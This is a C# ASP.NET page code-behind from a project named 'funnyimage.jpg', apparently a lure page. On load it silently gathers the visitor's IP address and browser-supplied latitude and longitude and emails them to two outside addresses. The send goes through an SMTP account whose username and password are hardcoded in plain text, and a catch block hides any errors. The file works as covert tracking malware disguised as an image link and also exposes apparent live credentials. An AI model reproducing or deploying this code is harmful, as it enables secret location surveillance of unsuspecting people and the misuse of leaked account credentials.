using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;


using funnyimage.jpg.Models;
using Newtonsoft.Json;
using System.Net.Mail;
using System.Net;

namespace funnyimage.jpg
{
    public partial class _default : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

             email();

        }



        protected string getJsonStringData()
        {

            string datajson = new System.Net.WebClient().DownloadString("http://api.hostip.info/get_json.php");
            //string datajson = new System.Net.WebClient().DownloadString("http://ipinfo.io/json");

           return datajson;

        }

        protected string getUserIP()
        {
            string VisitorIPReturn = string.Empty;
            string VisitorsIPAddr = string.Empty;
            if (HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED_FOR"] != null)
            {
                VisitorsIPAddr = HttpContext.Current.Request.ServerVariables["HTTP_X_FORWARDED_FOR"].ToString();
            }
            else if (HttpContext.Current.Request.UserHostAddress.Length != 0)
            {
                VisitorsIPAddr = HttpContext.Current.Request.UserHostAddress;
            }
            VisitorIPReturn = VisitorsIPAddr;

            return VisitorIPReturn;
        }

        protected string getData()
        {
            string data = string.Empty ;

          //  var empresult = JsonConvert.DeserializeObject<userData>(getJsonStringData());

     
            data += "IP:<b>  " + getUserIP() + "</b><br/>";

            //data += "IP:  " + empresult.ip + "<br/>";
            //data += "hostname:  " + empresult.hostname + "<br/>";
            //data += "city:  " + empresult.city + "<br/>";
            //data += "region: " + empresult.region + "<br/>";
            //data += "country: " + empresult.country + "<br/>";
            //data += "loc: " + empresult.loc + "<br/>";
            //data += "organization: " + empresult.org + "<br/>";

            //data += "postal code: " + empresult.postal + "<br/>";
            //data += "phone: " + empresult.phone + "<br/>";

            data += "User real data position if available<br/><b>latitude: " + HFXcoords.Value + "<b/><br/> longitude: <b>" + HFYcoords.Value + "</br>";

            return data;

        }

        protected void email()
        {
            try
            {
                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp-server.cfl.rr.com";
                smtp.Credentials = new NetworkCredential("hlam49@cfl.rr.com", "tincouch97");
                smtp.Port = 587;

                MailMessage mail = new MailMessage();
                MailAddress from_email = new MailAddress("hlam49@cfl.rr.com");
                mail.From = from_email;
                mail.To.Add(new MailAddress("akira32810@gmail.com"));
                mail.To.Add(new MailAddress("Jsnessita24@yahoo.com"));

                mail.Subject = "Info on User";
                mail.IsBodyHtml = true;

                mail.Body = getData();


                smtp.Send(mail);

                mail.Dispose();
            }

            catch
            {

            }


        }


        protected void btnGetHiddenCoord_Click(object sender, EventArgs e)
        {
            try
            {
                email();
            }

            catch
            {
                Response.Write("Server Error");
            }
        }

    }
}